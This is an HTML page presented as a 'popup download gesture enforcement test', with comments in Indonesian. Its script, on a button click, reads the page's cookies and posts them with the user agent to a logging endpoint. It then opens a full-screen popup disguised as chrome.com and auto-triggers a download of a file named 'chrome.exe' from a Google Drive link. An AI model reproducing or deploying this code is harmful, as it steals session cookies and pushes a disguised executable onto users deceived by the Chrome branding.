<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Download Gesture Test</title>
<style>
body { font-family:sans-serif;padding:20px }
button { padding:12px 18px;font-size:16px }
pre { background:#111;color:#0f0;padding:10px }
</style>
</head>
<body>

<h3>Popup Download Gesture Enforcement Test</h3>
<button id="btn">Open Popup</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => logEl.textContent += m + "\n";

document.getElementById("btn").onclick = () => {

  log("[1] User click received");

  // Capture cookie dari origin halaman ini
  const cookies = document.cookie;
  log("[COOKIE] " + cookies);

  // Kirim cookie ke endpoint (simulasi capture request)
  fetch("/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      cookie: cookies,
      ua: navigator.userAgent,
      time: new Date().toISOString()
    })
  }).catch(()=>{});

  // Popup
  const w = window.open(
    "https://chrome.com",
    "_blank",
    `
      width=${screen.availWidth},
      height=${screen.availHeight},
      left=0,
      top=0,
      resizable=yes,
      scrollbars=yes
    `
  );

  if (!w) {
    log("[ERROR] Popup blocked");
    return;
  }

  log("[2] Popup opened");

  try {
    w.document.write(`
      <a id="dl" download="chrome.exe"
       href="https://drive.usercontent.google.com/download?id=1rpMF3HMNrGGL47CQEkcVLzS674trhujL"></a>
      <script>
        setTimeout(() => {
          document.getElementById("dl").click();
        }, 50);
      <\/script>
    `);
  } catch(e){
    log("[ERROR] write blocked: " + e);
  }

  setTimeout(() => {
    try {
      w.location.href = "https://www.chrome.com";
      log("[3] Popup navigated");
    } catch (e) {
      log("[ERROR] Navigation failed: " + e);
    }
  }, 0);

};
</script>

</body>
</html>
